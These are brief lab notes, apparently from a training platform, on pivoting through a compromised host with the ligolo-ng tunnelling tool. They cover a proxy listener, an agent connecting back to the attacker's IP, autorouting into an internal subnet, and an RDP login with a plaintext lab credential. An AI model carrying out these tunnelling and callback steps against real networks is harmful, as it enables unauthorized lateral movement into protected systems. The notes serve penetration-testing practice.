# Download  
https://github.com/nicocha30/ligolo-ng  

## Topology  
10.10.14.22 <--> 10.129.247.87 <--> 172.16.5.19  

## Server Step 1
```
sudo ip tuntap add user $(whoami) mode tun ligolo  
sudo ip link set ligolo up  
sudo ./proxy -selfcert -laddr 0.0.0.0:443
```

## Client Step 1  
```
/agent -connect 10.10.14.22:443 -ignore-cert  
```

## Server Step 2  
```
session
autoroute  
```
## RDP  
```xfreerdp3 /v:172.16.5.19 /u:victor /p:'pass@123'```  

## Snapshot for Server  
<img width="1338" height="476" alt="image" src="https://github.com/user-attachments/assets/8870ed59-ad12-4f6a-bef9-d216579c5118" />  

## Snapshot for Client
<img width="662" height="85" alt="image" src="https://github.com/user-attachments/assets/2b1abdf8-cb71-4eb3-9a37-f91e47ff0c61" />  


